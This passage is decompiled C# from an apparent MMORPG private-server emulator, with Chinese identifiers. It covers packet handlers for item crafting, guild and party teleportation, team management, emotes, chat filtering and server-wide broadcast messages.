								int fLD_MAGIC6 = 装备栏包裹[hcItimesClass87.位置].FLD_MAGIC4;
								减去物品(num52, 1);
								减去物品(位置, 1);
								int 绑定 = 0;
								if (装备栏包裹[hcItimesClass87.位置].物品绑定)
								{
									绑定 = 1;
								}
								AddItemWithProperties(num24, 位置, 1, fLD_MAGIC, fLD_MAGIC3, fLD_MAGIC4, fLD_MAGIC5, fLD_MAGIC6, 0, 0, 0, 绑定, 0);
								合成物品表.Clear();
								合成系统解锁();
								打开仓库中 = false;
								元宝合成开关 = 0;
								合成提示(num, 1, 0, 装备栏包裹[hcItimesClass87.位置]);
							}
							return;
						}
					}
					catch (Exception ex32)
					{
						MainForm.WriteLine(1, "组合错误![" + base.Userid + "]-[" + base.UserName + "]" + ex32.Message);
					}
					return;
				case 371:
					try
					{
						if (合成物品表.ContainsKey(1))
						{
							return;
						}
						if (装备栏包裹[num30].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
						}
						else
						{
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value))
							{
								return;
							}
							if (value.FLD_RESIDE2 != 16)
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
								return;
							}
							int num74 = BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0);
							int num85 = num74;
							int num101 = num85;
							if ((uint)(num101 - 1000001170) <= 5u)
							{
								int num127 = num74 + 6;
								int num2 = num127;
								int num13 = num2;
								if ((uint)(num13 - 1000001176) <= 5u)
								{
									HcItimesClass hcItimesClass = new HcItimesClass();
									hcItimesClass.位置 = num30;
									hcItimesClass.物品 = 装备栏包裹[num30].物品_byte;
									HcItimesClass value99 = hcItimesClass;
									装备栏包裹[num30].锁定 = true;
									合成物品表.TryAdd(1, value99);
									合成提示(num, 1, 0, 装备栏包裹[num30]);
									炼金合成提示(num, 1, 0, 装备栏包裹[num30], num127);
								}
							}
							return;
						}
					}
					catch (Exception ex)
					{
						MainForm.WriteLine(1, "211披风分解 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex);
					}
					return;
				}
				if (num != 0)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex23)
			{
				元宝合成开关 = 0;
				MainForm.WriteLine(1, "合成系统出错![" + base.Userid + "]-[" + base.UserName + "][" + num + "]" + ex23.Message);
			}
		}

		public void 帮派传送(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (base.帮派Id == 0 || base.人物坐标_地图 == 41001 || base.人物坐标_地图 == 2501)
				{
					return;
				}
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
					return;
				}
				byte[] array = new byte[2];
				Buffer.BlockCopy(封包数据, 14, array, 0, 2);
				int num = BitConverter.ToInt16(array, 0);
				if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) != 1008000122)
				{
					return;
				}
				byte[] array2 = new byte[14];
				Buffer.BlockCopy(封包数据, 26, array2, 0, 14);
				string username = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 0)
				{
					return;
				}
				Players players = World.检查玩家name(username);
				if (players != null)
				{
					string[] array3 = World.地图锁定.Split(';');
					if (array3.Length >= 1)
					{
						for (int i = 0; i < array3.Length; i++)
						{
							if (int.Parse(array3[i]) == players.人物坐标_地图)
							{
								帮派传送符提示(8, num, 1008000122);
								return;
							}
						}
					}
					if (players.人物坐标_地图 == 42101 || players.人物坐标_地图 == 9001 || players.人物坐标_地图 == 9101 || players.人物坐标_地图 == 9201)
					{
						系统提示("此处不允许使用。");
						return;
					}
					if (players.人物坐标_地图 == 32002)
					{
						if (活动地图剩余时间 <= 0)
						{
							帮派传送符提示(8, num, 1008000122);
							系统提示("移动失败, 活动地图剩余时间为零。");
							return;
						}
						FBtime = DateTime.Now;
						系统提示("开始计时, [" + 活动地图剩余时间 + "]分钟后自动传送到泫勃派。");
						goto IL_02ff;
					}
					if (players.人物坐标_地图 != 30000 && players.人物坐标_地图 != 30100 && players.人物坐标_地图 != 30200 && players.人物坐标_地图 != 30300)
					{
						goto IL_02ff;
					}
					if (修炼地图剩余时间 > 0)
					{
						FBtime = DateTime.Now;
						系统提示("开始计时, [" + 修炼地图剩余时间 + "]分钟后自动传送到泫勃派。");
						goto IL_02ff;
					}
					帮派传送符提示(8, num, 1008000122);
					系统提示("移动失败, 修炼地图剩余时间为零。");
				}
				else
				{
					帮派传送符提示(2, num, 1008000122);
				}
				goto end_IL_0001;
				IL_02ff:
				if (players.UserName == base.UserName)
				{
					帮派传送符提示(3, num, 1008000122);
					return;
				}
				if (players.帮派Id != base.帮派Id)
				{
					帮派传送符提示(6, num, 1008000122);
					return;
				}
				帮派传送符提示(1, num, 1008000122);
				物品减去属性数量(num, 1);
				移动(players.人物坐标_X, players.人物坐标_Y, players.人物坐标_Z, players.人物坐标_地图);
				end_IL_0001:;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "帮派传送出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 组队传送(byte[] 封包数据, int length)
		{
			try
			{
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
					return;
				}
				int 人物坐标_地图 = base.人物坐标_地图;
				byte[] array = new byte[2];
				Buffer.BlockCopy(封包数据, 14, array, 0, 2);
				byte[] array2 = new byte[14];
				Buffer.BlockCopy(封包数据, 26, array2, 0, 14);
				string username = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				int num = BitConverter.ToInt16(array, 0);
				if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) != 1008000120 || BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 0)
				{
					return;
				}
				Players players = World.检查玩家name(username);
				if (players != null)
				{
					string[] array3 = World.地图锁定.Split(';');
					if (array3.Length >= 1)
					{
						for (int i = 0; i < array3.Length; i++)
						{
							if (int.Parse(array3[i]) == players.人物坐标_地图)
							{
								组队传送符提示(8, num, 1008000120);
								return;
							}
						}
					}
					if (players.人物坐标_地图 == 26000 && base.Player_Level < 130)
					{
						系统提示("等级达到130级才能进入此地图。");
						return;
					}
					if (players.人物坐标_地图 == 26100 && base.Player_Level < 140)
					{
						系统提示("等级达到140级才能进入此地图。");
						return;
					}
					if (players.人物坐标_地图 == 32002)
					{
						if (活动地图剩余时间 <= 0)
						{
							组队传送符提示(8, num, 1008000120);
							系统提示("移动失败, 活动地图剩余时间为零。");
							return;
						}
						FBtime = DateTime.Now;
						系统提示("开始计时, [" + 活动地图剩余时间 + "]分钟后自动传送到泫勃派。");
						goto IL_02e9;
					}
					if (players.人物坐标_地图 != 30000 && players.人物坐标_地图 != 30100 && players.人物坐标_地图 != 30200 && players.人物坐标_地图 != 30300)
					{
						goto IL_02e9;
					}
					if (修炼地图剩余时间 > 0)
					{
						FBtime = DateTime.Now;
						系统提示("开始计时, [" + 修炼地图剩余时间 + "]分钟后自动传送到泫勃派。");
						goto IL_02e9;
					}
					组队传送符提示(8, num, 1008000120);
					系统提示("移动失败, 修炼地图剩余时间为零。");
				}
				else
				{
					组队传送符提示(2, num, 1008000120);
				}
				goto end_IL_0001;
				IL_02e9:
				if (players.UserName == base.UserName)
				{
					组队传送符提示(3, num, 1008000120);
					return;
				}
				if (players.组队id != 组队id)
				{
					组队传送符提示(6, num, 1008000120);
					return;
				}
				移动(players.人物坐标_X, players.人物坐标_Y, players.人物坐标_Z, players.人物坐标_地图);
				if (人物坐标_地图 == base.人物坐标_地图)
				{
					组队传送符提示(7, num, 1008000120);
					return;
				}
				组队传送符提示(1, num, 1008000120);
				物品减去属性数量(num, 1);
				end_IL_0001:;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "组队传送出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 退出组队(byte[] data, int length)
		{
			if (World.Teams.TryGetValue(组队id, out var value))
			{
				value.退出(this, 0);
			}
		}

		public void 队长管理(byte[] data, int length)
		{
			try
			{
				byte[] array = new byte[4];
				Buffer.BlockCopy(data, 12, array, 0, 2);
				int 人物ID = BitConverter.ToInt32(array, 0);
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(data, 10, array2, 0, 1);
				switch (BitConverter.ToInt32(array2, 0))
				{
				case 1:
				{
					if (World.Teams.TryGetValue(组队id, out var value2))
					{
						Players players2 = 得到人物数据(人物ID);
						if (players2 != null)
						{
							value2.委任队长(this, players2);
						}
					}
					break;
				}
				case 2:
				{
					if (World.Teams.TryGetValue(组队id, out var value))
					{
						Players players = 得到人物数据(人物ID);
						if (players != null)
						{
							value.退出(players, 0);
						}
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "队长管理出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 显示队员()
		{
			try
			{
				if (World.JlMsg == 1)
				{
					MainForm.WriteLine(0, "Players_显示队员");
				}
				if (!World.Teams.TryGetValue(组队id, out var value))
				{
					return;
				}
				using 发包类 发包类 = new 发包类();
				发包类.Write(value.道具分配规则);
				发包类.Write(value.队伍级别);
				发包类.Write(0);
				发包类.Write(value.组队列表.Count);
				foreach (Players value2 in value.组队列表.Values)
				{
					if (value2.UserName == value.队长)
					{
						发包类.Write(1);
					}
					else
					{
						发包类.Write(0);
					}
					发包类.Write(0);
					发包类.Write2(value2.人物全服ID);
					发包类.Write4(value2.人物_HP);
					发包类.Write4(value2.人物_MP);
					发包类.Write4(value2.人物最大_HP);
					发包类.Write4(value2.人物最大_MP);
					发包类.WriteString(value2.UserName, 14);
					发包类.Write2(0);
					发包类.Write(1);
					发包类.Write(0);
					发包类.Write(value2.Player_Job);
					发包类.Write(0);
					发包类.Write4(0);
				}
				for (int i = 0; i < value.组队列表.Count; i++)
				{
					if (base.Client != null)
					{
						base.Client.SendPak(发包类, 30720, base.人物全服ID);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "显示队员()错误[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 委任队长提示(Players Playe, Players ToPlaye)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA553200000029002400010001000000C8CE0000000000000000000000000100D1E0D00000000000000000000000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 14, 2);
				byte[] bytes = Encoding.Default.GetBytes(Playe.UserName);
				Buffer.BlockCopy(bytes, 0, array, 16, bytes.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(ToPlaye.人物全服ID), 0, array, 30, 2);
				byte[] bytes2 = Encoding.Default.GetBytes(ToPlaye.UserName);
				Buffer.BlockCopy(bytes2, 0, array, 32, bytes2.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "委任队长提示出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 解散组队提示()
		{
			byte[] array = Converter.hexStringToByte("AA55120000003700040003000200000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 本人退出组队提示()
		{
			byte[] array = Converter.hexStringToByte("AA5510000000370002000500000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 退出组队提示(Players Playe)
		{
			byte[] array = Converter.hexStringToByte("AA5525000A0037001700020001000B000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 14, 2);
			byte[] bytes = Encoding.Default.GetBytes(Playe.UserName);
			Buffer.BlockCopy(bytes, 0, array, 16, bytes.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 加入组队提示(Players Playe)
		{
			byte[] array = Converter.hexStringToByte("AA5525000100350017000100010002000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 14, 2);
			byte[] bytes = Encoding.Default.GetBytes(Playe.UserName);
			Buffer.BlockCopy(bytes, 0, array, 16, bytes.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 本人取消组队(byte[] data, int length)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA5512000B003300040001000100000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (!World.Teams.TryGetValue(组队id, out var value))
				{
					return;
				}
				if (value.邀请人 != null)
				{
					value.邀请人.组队id = 0;
					value.邀请人.组队阶段 = 0;
					if (value.邀请人.Client != null)
					{
						value.邀请人.Client.Send(array, array.Length);
					}
					value.邀请人 = null;
				}
				if (value.组队列表.Count <= 1)
				{
					value.Dispose();
					World.Teams.TryRemove(组队id, out var _);
					组队id = 0;
					组队阶段 = 0;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "本人取消组队出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 对方取消组队(byte[] data, int length)
		{
			try
			{
				byte[] array = new byte[4];
				Buffer.BlockCopy(data, 14, array, 0, 2);
				int 人物ID = BitConverter.ToInt32(array, 0);
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(data, 12, array2, 0, 1);
				switch (BitConverter.ToInt32(array2, 0))
				{
				case 1:
				{
					if (World.Teams.TryGetValue(组队id, out var value2))
					{
						value2.邀请人 = null;
						if (value2.组队列表.Count <= 8 && !value2.组队列表.ContainsKey(base.人物全服ID))
						{
							value2.组队列表.TryAdd(base.人物全服ID, this);
							value2.加入队员提示(this);
						}
					}
					break;
				}
				case 2:
				{
					byte[] array3 = Converter.hexStringToByte("AA551200F5013500040001000200000000000000FF3055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					base.Client.Send(array3, array3.Length);
					if (!World.Teams.TryGetValue(组队id, out var value))
					{
						break;
					}
					Players players = 得到人物数据(人物ID);
					if (players != null)
					{
						if (players.Client != null)
						{
							players.Client.Send(array3, array3.Length);
						}
						value.邀请人 = null;
						if (value.组队列表.Count <= 1)
						{
							value.Dispose();
							World.Teams.TryRemove(组队id, out var _);
							players.组队id = 0;
							组队id = 0;
						}
						else
						{
							组队id = 0;
						}
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "对方取消组队出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 发送组队数据(string 邀请人, int 成败, int 提示, int 分配方式, int 标记)
		{
			byte[] array = Converter.hexStringToByte("AA551E0013013100180001000100010000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(成败), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(提示), 0, array, 12, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(分配方式), 0, array, 14, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 16, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(标记), 0, array, 18, 2);
			byte[] bytes = Encoding.Default.GetBytes(邀请人);
			Buffer.BlockCopy(bytes, 0, array, 20, bytes.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 发送组队(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (进店中 || 打开仓库中)
				{
					return;
				}
				byte[] array = new byte[4];
				Buffer.BlockCopy(封包数据, 14, array, 0, 2);
				int 人物ID = BitConverter.ToInt32(array, 0);
				string hex = "AA5529000B0031001B00010001000A00000000000000000000000000000000000000000000000000000000000055AA";
				byte[] array2 = Converter.hexStringToByte(hex);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 16, 2);
				Players players = 得到人物数据(人物ID);
				if (players == null || (players.个人商店 != null && players.个人商店.个人商店是否开启) || players.进店中 || !(players.UserName != base.UserName))
				{
					发送组队数据(base.UserName, 2, 13, 0, 1);
				}
				else if (players.Config.组队 == 0)
				{
					发送组队数据(base.UserName, 2, 13, 0, 1);
					系统提示("对方设置不容许组队", 9, "系统提示");
				}
				else if (Math.Abs(base.Player_Level - players.Player_Level) >= World.组队级别限制)
				{
					发送组队数据(base.UserName, 2, 6, 0, 1);
					系统提示("只有双方等级相差在" + World.组队级别限制 + "级以内才可以组队!", 20, "系统提示");
				}
				else
				{
					if (players.组队id != 0)
					{
						return;
					}
					if (World.Teams.TryGetValue(组队id, out var value))
					{
						value.邀请人 = players;
						players.组队id = 组队id;
					}
					else
					{
						value = new TeamClass(this)
						{
							邀请人 = players
						};
						组队id = World.Add组队(value);
						players.组队id = 组队id;
						value.组队id = 组队id;
					}
					if (players.离线挂机打怪模式 == 1 && !players.安全区禁止下毒(this))
					{
						if (World.Teams.TryGetValue(组队id, out var value2))
						{
							value2.邀请人 = null;
							if (value2.组队列表.Count <= 8 && !value2.组队列表.ContainsKey(players.人物全服ID))
							{
								value2.组队列表.TryAdd(players.人物全服ID, players);
								value2.加入队员提示(players);
							}
						}
						return;
					}
					byte[] bytes = Encoding.Default.GetBytes(base.UserName);
					Buffer.BlockCopy(bytes, 0, array2, 20, bytes.Length);
					Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array2, 4, 2);
					if (players.Client != null)
					{
						players.Client.Send(array2, array2.Length);
					}
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array2, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
					return;
				}
			}
			catch (Exception ex)
			{
				组队id = 0;
				MainForm.WriteLine(1, "发送组队出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 狮吼功线程(object ParObject)
		{
			try
			{
				if (base.FLD_RXPIONT >= World.每次狮吼功消耗元宝)
				{
					string str = "高富帅";
					if (base.Player_Sex == 2)
					{
						str = "白富美";
					}
					CheckTreasureGems();
					检察元宝数据(World.每次狮吼功消耗元宝, 0, "狮子吼");
					RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "狮吼功消耗", 1, World.每次狮吼功消耗元宝);
					SaveGemData();
					foreach (Players value in World.AllConnectedPlayers.Values)
					{
						if (!value.Client.挂机)
						{
							value.系统提示((string)ParObject, 6, str + "[" + base.UserName + "]");
							Thread.Sleep(100);
						}
					}
				}
				else
				{
					系统提示("元宝不够了，每次使用狮吼功扣除" + World.每次狮吼功消耗元宝 + "元宝。");
				}
			}
			catch
			{
			}
		}

		public void 萌犬表情效果(int 物品id, int 开关, uint 时间, uint 当前时间)
		{
			Convert.ToDouble(DateTime.ParseExact(时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture).AddMinutes(0L - (long)当前时间).ToString("yyMMddHHmm"));
			byte[] array = Converter.hexStringToByte("AA553900010040022B0027004A010D15038203440101000000C9E3143C20060C0000000001A502BB7135F1B971400FE0F600E02000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(物品id), 0, array, 25, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(开关), 0, array, 33, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(时间), 0, array, 37, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 萌犬表情数据包(int id)
		{
			byte[] array = Converter.hexStringToByte("AA552800010040021A001600AE000830016600A800190100E00D00401700052003E07E00000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 30, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 15, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 说话(byte[] 封包数据, int 封包大小)
		{
			if (base.Player_Level < 1)
			{
				系统提示("为防止恶意刷屏, 维护游戏秩序.需达到" + 1 + "级以上才能说话, 谢谢合作!", 10, "系统提示");
			}
			int num = 0;
			try
			{
				int num2 = 封包数据[39];
				int num3 = 封包数据[10];
				int num4 = 封包数据[34];
				if (num4 > 99)
				{
					num4 = 99;
				}
				byte[] array = new byte[num4];
				num = 1;
				string text;
				try
				{
					Buffer.BlockCopy(封包数据, 35, array, 0, array.Length);
					text = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
				}
				catch (Exception ex)
				{
					MainForm.WriteLine(1, "说话出错1![" + base.Userid + "]-[" + base.UserName + "]" + array.Length + " " + ex.Message);
					return;
				}
				if (text == World.异口同声内容 && World.异口同声开启中 == 1 && !追加状态列表.ContainsKey(1008000396))
				{
					异口同声(text);
					return;
				}
				if (num3 == 25)
				{
					switch (num2)
					{
					case 1:
						萌犬表情数据包(1);
						return;
					case 2:
						萌犬表情数据包(2);
						return;
					case 3:
						萌犬表情数据包(3);
						return;
					case 4:
						萌犬表情数据包(4);
						return;
					case 5:
						萌犬表情数据包(5);
						return;
					case 6:
						萌犬表情数据包(6);
						return;
					case 7:
						萌犬表情数据包(7);
						return;
					case 8:
						萌犬表情数据包(8);
						return;
					case 9:
						萌犬表情数据包(9);
						return;
					case 10:
						萌犬表情数据包(10);
						return;
					}
				}
				num = 2;
				byte[] array2 = new byte[15];
				Buffer.BlockCopy(封包数据, 12, array2, 0, array2.Length);
				string name = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				if (text.Length <= 0 || num3 == 100)
				{
					return;
				}
				num = 3;
				foreach (KillClass item in World.Kill)
				{
					if (text.Replace(" ", string.Empty).IndexOf(item.Txt) == -1)
					{
						continue;
					}
					if (item.Sffh == 0)
					{
						text = text.Replace(" ", string.Empty).Replace(item.Txt, "我爱" + World.ServerName);
						continue;
					}
					if (item.Sffh != 1)
					{
						if (item.Sffh != 2)
						{
							if (item.Sffh != 3)
							{
								continue;
							}
							return;
						}
						DBA.ExeSqlCommand($" Insert into TBL_BANED values ( '{base.Client}')", "rxjhaccount");
						封号(720, base.Userid, "发过滤文字");
						return;
					}
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
					return;
				}
				num = 4;
				if (num3 != 0 || !ParseCommand(text))
				{
					if (num3 == 32)
					{
						World.conn.发送("同盟聊天|" + base.帮派名字 + "|" + base.UserName + "|" + text + "|" + World.服务器组ID);
					}
					else
					{
						num = 5;
						发送消息(text, num3, name);
					}
				}
			}
			catch (Exception ex2)
			{
				string text2 = Converter.ToString(封包数据);
				MainForm.WriteLine(1, "说话出错![" + base.Userid + "]-[" + base.UserName + "] [" + num + "] [" + text2 + "]" + ex2.Message);
			}
		}

		public void 发送消息(string msg, int msgType, string name)
		{
			try
			{
				if (DateTime.Now.Subtract(发送消息time).TotalSeconds < 1.0)
				{
					系统提示("发送消息太快，请慢点说。");
					return;
				}
				if (World.禁言列表.TryGetValue(base.UserName, out var _))
				{
					系统提示("你已被系统禁言。");
					return;
				}
				发送消息time = DateTime.Now;
				byte[] array = Converter.hexStringToByte("AA55A50000006600970000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
				array[10] = (byte)msgType;
				string text = name;
				string text2 = text;
				if (text2 == "" || text2 == null)
				{
					name = base.UserName;
				}
				byte[] bytes = Encoding.Default.GetBytes(name);
				byte[] bytes2 = Encoding.Default.GetBytes(msg);
				Buffer.BlockCopy(bytes2, 0, array, 35, bytes2.Length);
				Buffer.BlockCopy(bytes, 0, array, 12, bytes.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				int num = 0;
				switch (msgType)
				{
				case 204:
				{
					if (DateTime.Now.Subtract(狮子吼time).TotalSeconds < 1.0)
					{
						系统提示("狮子吼每1秒可使用一回。");
						int num3 = 0;
						for (int i = 0; i < 装备栏包裹.Length; i++)
						{
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000028)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000027)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000026)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000025)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000041)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000042)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000047)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000048)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000029)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000030)
							{
								物品减去属性数量(i, num3);
								if (num3 > 0)
								{
									num3 = 0;
								}
							}
						}
						break;
					}
					狮子吼time = DateTime.Now;
					int num4 = 1;
					for (int j = 0; j < 装备栏包裹.Length; j++)
					{
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000028)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 204;
						}
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000027)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 204;
						}
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000026)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 204;
						}
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000025)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 204;
						}
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000041)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 41;
						}
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000042)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 41;
						}
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000047)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 38;
						}
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000048)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 38;
						}
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000029)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 35;
						}
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000030)
						{
							物品减去属性数量(j, num4);
							if (num4 > 0)
							{
								num4 = 0;
							}
							num = 35;
						}
					}
					World.conn.发送("狮子吼|" + base.人物全服ID + "|" + base.UserName + "|" + msg + "|" + base.Client.ToString() + "|" + World.ServerID + "|" + base.人物坐标_地图 + "|" + num);
					break;
				}
				case 14:
				{
					if (DateTime.Now.Subtract(狮子吼time).TotalSeconds < 1.0)
					{
						系统提示("狮子吼每1秒可使用一回。");
						int num5 = 0;
						for (int k = 0; k < 装备栏包裹.Length; k++)
						{
							if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000001)
							{
								物品减去属性数量(k, num5);
								if (num5 > 0)
								{
									num5 = 0;
								}
							}
						}
						break;
					}
					狮子吼time = DateTime.Now;
					int num6 = 1;
					for (int l = 0; l < 装备栏包裹.Length; l++)
					{
						if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000001)
						{
							物品减去属性数量(l, num6);
							if (num6 > 0)
							{
								num6 = 0;
							}
						}
					}
